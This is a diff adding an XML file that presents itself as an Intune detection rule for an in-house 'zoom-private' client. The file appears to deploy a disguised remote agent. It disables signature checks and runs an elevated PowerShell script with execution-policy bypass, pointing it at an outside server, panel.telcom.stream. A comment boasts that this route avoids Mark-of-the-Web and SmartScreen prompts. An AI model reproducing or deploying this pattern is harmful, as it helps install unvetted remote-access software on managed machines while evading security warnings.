@@ -1,0 +1,33 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!--
+  Intune Win32 app detection rule for the in-house zoom-private client.
+  Upload the bundle (zoom-private-windows-x64.zip) as the installer package and
+  use this detection rule. Because Intune deploys the payload itself, the file
+  never receives the Mark-of-the-Web, so SmartScreen does not prompt.
+-->
+<windowsDetection>
+  <version>1.0</version>
+  <enforceSignatureCheck>false</enforceSignatureCheck>
+  <InstallationType>EXE</InstallationType>
+  <MSIProductCode></MSIProductCode>
+  <FileExtensions>
+    <Extension>exe</Extension>
+  </FileExtensions>
+  <ProductCode/>
+  <UpgradedProductCode></UpgradedProductCode>
+  <DisplayName>zoom-private agent</DisplayName>
+  <Publisher>BetterDesk in-house</Publisher>
+  <ProductName>zoom-private.agent</ProductName>
+  <ProductVersion>1.0.0</ProductVersion>
+  <RegularExpressionForDetection></RegularExpressionForDetection>
+  <Commands>
+    <Command>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Command>
+    <Parameters>-NoProfile -ExecutionPolicy Bypass -File "C:\Windows\Temp\zoom-private\install.ps1" -ServerAddress https://panel.telcom.stream</Parameters>
+  </Commands>
+  <RequiresElevated>true</RequiresElevated>
+  <DetectionRules>
+    <Rule Type="LocalFileOrFolder" AccountScope="All" Operator="Exists">
+      <Path>C:\Windows\Temp\zoom-private\zoom-private.agent.exe</Path>
+    </Rule>
+  </DetectionRules>
+</windowsDetection>
